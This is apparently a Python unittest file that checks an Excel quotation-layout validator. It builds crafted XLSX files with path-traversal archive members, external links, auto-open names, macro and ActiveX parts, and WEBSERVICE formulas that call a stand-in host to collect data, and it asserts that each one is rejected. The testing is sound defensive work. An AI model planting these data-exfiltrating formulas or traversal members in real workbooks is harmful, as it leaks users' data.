import io
import zipfile
import unittest
from pathlib import Path
from unittest import mock
from xml.etree import ElementTree as ET

from webapp import server as webapp


ROOT = Path(__file__).resolve().parents[1]
BASE_LAYOUT = ROOT / "templates" / "quote-layout" / "quotation-layout.xlsx"
FIXTURE_LAYOUT = (
    ROOT
    / "tests"
    / "fixtures"
    / "quote-generator"
    / "profiles"
    / "synthetic-exhibition-fixture-template"
    / "quotation-layout.xlsx"
)
REL_ID = "{http://schemas.openxmlformats.org/officeDocument/2006/relationships}id"


def rewritten_layout(mutator) -> bytes:
    with zipfile.ZipFile(BASE_LAYOUT) as source:
        parts = {info.filename: source.read(info) for info in source.infolist() if not info.is_dir()}
    mutator(parts)
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", compression=zipfile.ZIP_DEFLATED) as target:
        for name, value in parts.items():
            target.writestr(name, value)
    return buffer.getvalue()


def layout_with_extra_member(name: str, value: bytes = b"synthetic") -> bytes:
    return rewritten_layout(lambda parts: parts.__setitem__(name, value))


def layout_with_duplicate_member(name: str) -> bytes:
    with zipfile.ZipFile(BASE_LAYOUT) as source:
        entries = [(info.filename, source.read(info)) for info in source.infolist() if not info.is_dir()]
    duplicate = next(value for entry_name, value in entries if entry_name == name)
    buffer = io.BytesIO()
    with zipfile.ZipFile(buffer, "w", compression=zipfile.ZIP_DEFLATED) as target:
        for entry_name, value in entries:
            target.writestr(entry_name, value)
        target.writestr(name, duplicate)
    return buffer.getvalue()


def layout_with_external_relationship() -> bytes:
    def mutate(parts):
        root = ET.fromstring(parts["xl/_rels/workbook.xml.rels"])
        ET.SubElement(
            root,
            f"{{{webapp.PACKAGE_RELATIONSHIPS_XMLNS}}}Relationship",
            {
                "Id": "rIdExternal",
                "Type": "http://schemas.openxmlformats.org/officeDocument/2006/relationships/externalLink",
                "Target": "https://private.example.test/workbook.xlsx",
                "TargetMode": "External",
            },
        )
        parts["xl/_rels/workbook.xml.rels"] = ET.tostring(root, encoding="utf-8", xml_declaration=True)

    return rewritten_layout(mutate)


def layout_with_formula() -> bytes:
    def mutate(parts):
        root = ET.fromstring(parts["xl/worksheets/sheet1.xml"])
        sheet_data = root.find(f"{webapp.NS_MAIN}sheetData")
        if sheet_data is None:
            sheet_data = ET.SubElement(root, f"{webapp.NS_MAIN}sheetData")
        row = ET.SubElement(sheet_data, f"{webapp.NS_MAIN}row", {"r": "999"})
        cell = ET.SubElement(row, f"{webapp.NS_MAIN}c", {"r": "A999"})
        formula = ET.SubElement(cell, f"{webapp.NS_MAIN}f")
        formula.text = 'WEBSERVICE("https://private.example.test/collect")'
        parts["xl/worksheets/sheet1.xml"] = ET.tostring(root, encoding="utf-8", xml_declaration=True)

    return rewritten_layout(mutate)


def layout_with_formula_node(tag: str) -> bytes:
    def mutate(parts):
        root = ET.fromstring(parts["xl/worksheets/sheet1.xml"])
        data_validations = ET.SubElement(root, f"{webapp.NS_MAIN}dataValidations", {"count": "1"})
        validation = ET.SubElement(
            data_validations,
            f"{webapp.NS_MAIN}dataValidation",
            {"sqref": "A1", "type": "custom"},
        )
        formula = ET.SubElement(validation, f"{webapp.NS_MAIN}{tag}")
        formula.text = 'WEBSERVICE("https://private.example.test/collect")'
        parts["xl/worksheets/sheet1.xml"] = ET.tostring(
            root,
            encoding="utf-8",
            xml_declaration=True,
        )

    return rewritten_layout(mutate)


def layout_with_table_formula() -> bytes:
    def mutate(parts):
        worksheet = ET.fromstring(parts["xl/worksheets/sheet1.xml"])
        table_parts = ET.SubElement(worksheet, f"{webapp.NS_MAIN}tableParts", {"count": "1"})
        ET.SubElement(table_parts, f"{webapp.NS_MAIN}tablePart", {REL_ID: "rIdTable"})
        parts["xl/worksheets/sheet1.xml"] = ET.tostring(
            worksheet,
            encoding="utf-8",
            xml_declaration=True,
        )

        relationships = ET.fromstring(parts["xl/worksheets/_rels/sheet1.xml.rels"])
        ET.SubElement(
            relationships,
            f"{{{webapp.PACKAGE_RELATIONSHIPS_XMLNS}}}Relationship",
            {
                "Id": "rIdTable",
                "Type": "http://schemas.openxmlformats.org/officeDocument/2006/relationships/table",
                "Target": "../tables/table1.xml",
            },
        )
        parts["xl/worksheets/_rels/sheet1.xml.rels"] = ET.tostring(
            relationships,
            encoding="utf-8",
            xml_declaration=True,
        )

        content_types = ET.fromstring(parts["[Content_Types].xml"])
        content_type_namespace = content_types.tag.partition("}")[0].lstrip("{")
        ET.SubElement(
            content_types,
            f"{{{content_type_namespace}}}Override",
            {
                "PartName": "/xl/tables/table1.xml",
                "ContentType": "application/vnd.openxmlformats-officedocument.spreadsheetml.table+xml",
            },
        )
        parts["[Content_Types].xml"] = ET.tostring(
            content_types,
            encoding="utf-8",
            xml_declaration=True,
        )
        parts["xl/tables/table1.xml"] = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<table xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" '
            'id="1" name="Table1" displayName="Table1" ref="A1:A2">'
            '<tableColumns count="1"><tableColumn id="1" name="Value">'
            '<calculatedColumnFormula>WEBSERVICE("https://private.example.test/collect")'
            '</calculatedColumnFormula></tableColumn></tableColumns>'
            '</table>'
        ).encode("utf-8")

    return rewritten_layout(mutate)


def layout_with_comments() -> bytes:
    def mutate(parts):
        relationships = ET.fromstring(parts["xl/worksheets/_rels/sheet1.xml.rels"])
        ET.SubElement(
            relationships,
            f"{{{webapp.PACKAGE_RELATIONSHIPS_XMLNS}}}Relationship",
            {
                "Id": "rIdComments",
                "Type": "http://schemas.openxmlformats.org/officeDocument/2006/relationships/comments",
                "Target": "../comments1.xml",
            },
        )
        parts["xl/worksheets/_rels/sheet1.xml.rels"] = ET.tostring(
            relationships,
            encoding="utf-8",
            xml_declaration=True,
        )

        content_types = ET.fromstring(parts["[Content_Types].xml"])
        content_type_namespace = content_types.tag.partition("}")[0].lstrip("{")
        ET.SubElement(
            content_types,
            f"{{{content_type_namespace}}}Override",
            {
                "PartName": "/xl/comments1.xml",
                "ContentType": "application/vnd.openxmlformats-officedocument.spreadsheetml.comments+xml",
            },
        )
        parts["[Content_Types].xml"] = ET.tostring(
            content_types,
            encoding="utf-8",
            xml_declaration=True,
        )
        parts["xl/comments1.xml"] = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<comments xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
            '<authors><author>Previous Customer</author></authors>'
            '<commentList><comment ref="A1" authorId="0"><text>'
            '<t>Private prior-customer note</t></text></comment></commentList>'
            '</comments>'
        ).encode("utf-8")

    return rewritten_layout(mutate)


def layout_with_non_sqag_custom_xml() -> bytes:
    def mutate(parts):
        relationships = ET.fromstring(parts["_rels/.rels"])
        ET.SubElement(
            relationships,
            f"{{{webapp.PACKAGE_RELATIONSHIPS_XMLNS}}}Relationship",
            {
                "Id": "rIdPrivateCustomXml",
                "Type": "http://schemas.openxmlformats.org/officeDocument/2006/relationships/customXml",
                "Target": "customXml/private-customer.xml",
            },
        )
        parts["_rels/.rels"] = ET.tostring(
            relationships,
            encoding="utf-8",
            xml_declaration=True,
        )
        parts["customXml/private-customer.xml"] = (
            b'<?xml version="1.0" encoding="UTF-8"?>'
            b'<private>Previous Customer Secret</private>'
        )

    return rewritten_layout(mutate)


def layout_with_invalid_sqag_custom_xml() -> bytes:
    return rewritten_layout(
        lambda parts: parts.__setitem__(
            webapp.LAYOUT_RULES_CUSTOM_XML_PATH,
            b'<?xml version="1.0" encoding="UTF-8"?><private>Previous Customer Secret</private>',
        )
    )


def layout_with_auto_open_name() -> bytes:
    def mutate(parts):
        root = ET.fromstring(parts["xl/workbook.xml"])
        defined_names = root.find(f"{webapp.NS_MAIN}definedNames")
        if defined_names is None:
            defined_names = ET.SubElement(root, f"{webapp.NS_MAIN}definedNames")
        name = ET.SubElement(defined_names, f"{webapp.NS_MAIN}definedName", {"name": "Auto_Open"})
        name.text = "Quotation!$A$1"
        parts["xl/workbook.xml"] = ET.tostring(root, encoding="utf-8", xml_declaration=True)

    return rewritten_layout(mutate)


def layout_with_print_area(value: str) -> bytes:
    def mutate(parts):
        root = ET.fromstring(parts["xl/workbook.xml"])
        defined_names = root.find(f"{webapp.NS_MAIN}definedNames")
        if defined_names is None:
            defined_names = ET.SubElement(root, f"{webapp.NS_MAIN}definedNames")
        name = ET.SubElement(
            defined_names,
            f"{webapp.NS_MAIN}definedName",
            {"name": "_xlnm.Print_Area"},
        )
        name.text = value
        parts["xl/workbook.xml"] = ET.tostring(root, encoding="utf-8", xml_declaration=True)

    return rewritten_layout(mutate)


def layout_with_second_sheet(*, hidden: bool) -> bytes:
    def mutate(parts):
        workbook = ET.fromstring(parts["xl/workbook.xml"])
        sheets = workbook.find(f"{webapp.NS_MAIN}sheets")
        if sheets is None:
            sheets = ET.SubElement(workbook, f"{webapp.NS_MAIN}sheets")
        attributes = {"name": "Private Data", "sheetId": "2", REL_ID: "rIdPrivate"}
        if hidden:
            attributes["state"] = "hidden"
        ET.SubElement(sheets, f"{webapp.NS_MAIN}sheet", attributes)
        parts["xl/workbook.xml"] = ET.tostring(workbook, encoding="utf-8", xml_declaration=True)

        relationships = ET.fromstring(parts["xl/_rels/workbook.xml.rels"])
        ET.SubElement(
            relationships,
            f"{{{webapp.PACKAGE_RELATIONSHIPS_XMLNS}}}Relationship",
            {
                "Id": "rIdPrivate",
                "Type": "http://schemas.openxmlformats.org/officeDocument/2006/relationships/worksheet",
                "Target": "worksheets/sheet2.xml",
            },
        )
        parts["xl/_rels/workbook.xml.rels"] = ET.tostring(
            relationships,
            encoding="utf-8",
            xml_declaration=True,
        )
        parts["xl/worksheets/sheet2.xml"] = (
            '<?xml version="1.0" encoding="UTF-8"?>'
            '<worksheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main">'
            '<sheetData><row r="1"><c r="A1" t="inlineStr"><is><t>Private customer data</t></is></c></row></sheetData>'
            "</worksheet>"
        ).encode("utf-8")

    return rewritten_layout(mutate)


class ProfileLayoutSafetyTest(unittest.TestCase):
    def assert_layout_rejected(self, raw: bytes, pattern: str = "Quotation layout") -> None:
        with self.assertRaisesRegex(ValueError, pattern):
            webapp.validate_profile_layout_xlsx(raw)

    def test_supported_layouts_and_embedded_rules_remain_valid(self):
        for path in (BASE_LAYOUT, FIXTURE_LAYOUT):
            with self.subTest(path=path):
                raw = path.read_bytes()
                webapp.validate_profile_layout_xlsx(raw)
                embedded = webapp.xlsx_bytes_with_embedded_layout_rules(
                    raw,
                    {"output": {"master_format": "xlsx"}},
                )
                webapp.validate_profile_layout_xlsx(embedded)

    def test_rejects_unbounded_expansion_and_member_count(self):
        expanded = layout_with_extra_member("xl/media/padding.png", b"A" * 4096)
        with mock.patch.object(webapp, "MAX_PROFILE_LAYOUT_XLSX_TOTAL_UNCOMPRESSED_BYTES", 1024):
            self.assert_layout_rejected(expanded, "safe limits")

        with mock.patch.object(webapp, "MAX_PROFILE_LAYOUT_XLSX_MEMBERS", 4):
            self.assert_layout_rejected(BASE_LAYOUT.read_bytes(), "safe limits")

    def test_rejects_unsafe_and_duplicate_archive_members(self):
        self.assert_layout_rejected(layout_with_extra_member("../outside.xml"), "unsafe archive")
        self.assert_layout_rejected(
            layout_with_duplicate_member("xl/workbook.xml"),
            "unsafe archive",
        )

    def test_rejects_external_relationships_and_active_parts(self):
        self.assert_layout_rejected(layout_with_external_relationship(), "active or external")
        for name in (
            "xl/vbaProject.bin",
            "xl/embeddings/oleObject1.bin",
            "xl/activeX/activeX1.bin",
            "customUI/customUI.xml",
            "xl/webExtensions/webExtension1.xml",
        ):
            with self.subTest(name=name):
                self.assert_layout_rejected(layout_with_extra_member(name), "active or external")

    def test_rejects_hidden_comments_and_non_sqag_custom_xml(self):
        self.assert_layout_rejected(layout_with_comments(), "active or external")
        self.assert_layout_rejected(layout_with_non_sqag_custom_xml(), "active or external")
        self.assert_layout_rejected(layout_with_invalid_sqag_custom_xml(), "active or external")

    def test_rejects_formulas_and_auto_open_defined_names(self):
        self.assert_layout_rejected(layout_with_formula(), "formulas")
        for tag in ("formula", "formula1", "formula2"):
            with self.subTest(tag=tag):
                self.assert_layout_rejected(layout_with_formula_node(tag), "formulas")
        self.assert_layout_rejected(layout_with_table_formula(), "active or external")
        self.assert_layout_rejected(layout_with_print_area('EXEC("calc")'), "active or external")
        webapp.validate_profile_layout_xlsx(layout_with_print_area("'Quotation'!$A$1:$J$100"))
        self.assert_layout_rejected(layout_with_auto_open_name(), "active or external")

    def test_rejects_extra_or_hidden_worksheets(self):
        self.assert_layout_rejected(layout_with_second_sheet(hidden=False))
        self.assert_layout_rejected(layout_with_second_sheet(hidden=True))


if __name__ == "__main__":
    unittest.main()
